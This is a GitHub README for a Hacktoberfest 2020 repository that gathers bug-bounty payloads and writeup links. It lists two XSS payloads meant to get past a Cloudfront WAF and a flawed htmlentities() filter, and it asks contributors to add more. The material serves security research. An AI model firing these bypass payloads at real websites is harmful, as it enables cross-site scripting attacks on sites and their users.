<center><img src="https://hacktoberfest.digitalocean.com/assets/h-dark-d1a5f262f5aa5936d3bc526365938d98f3946e669f6e2cd9ae1e7a848c57e351.svg" alt="drawing" width="200"/></center>

# Hacktoberfest 2020

Hacktoberfest® is open to everyone in our global community. Whether you’re a developer, student learning to code, event host, or company of any size, you can help drive growth of open source and make positive contributions to an ever-growing community. All backgrounds and skill levels are encouraged to complete the challenge.

- Hacktoberfest is a celebration open to everyone in our global community.
- Pull requests can be made in any GitHub-hosted repositories/projects.
- You can sign up anytime between October 1 and October 31.
## Let's contribute the easy way

For this time I will try to fill in the repo with a payload related to Bug Hunting, you can add it to participate in the Hacktoberfest 2020 event and also make it easier for other Bug Hunters to handle problems such as payloads being blocked by WAF and others by adding your payload in a new file with the format shown below.

## Payload List
##### XSS Bypass Cloudfront WAF By Noobsec
```html
x"><--<img src= "><details/open/ontoggle=alert(`mindbl0w@bugcrodninja.com`)>> --!>=
```
---
##### XSS Bypass htmlentities() [bad implementation case]
```html
%2522%253E%253Csvg%252Fonload%253Dalert%25281%2529%253E
```
---

## Writeup List
##### No Rate Limiting to Bypass Phone Verification
- [Account Takeover ~ Yasuyadav](https://medium.com/@vasuyadav0786/5-ways-to-do-ato-in-a-single-website-cfe7e5da987e)
---
- [Parameter Tampering ~ Suneets1ngh](https://medium.com/@suneets1ngh/parameter-tampering-ddd9b3de0da8)
---
- [IDOR ~ bugbountywriteup](https://medium.com/bugbountywriteup/pii-leakage-via-idor-weak-passwordreset-full-account-takeover-58d159f88d73)
---
- [XSS  ~ Alonnsoandres](https://medium.com/@alonnsoandres/25k-instagram-almost-xss-filter-link-facebook-bug-bounty-798b10c13b83)
---
## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License
[MIT](https://choosealicense.com/licenses/mit/)
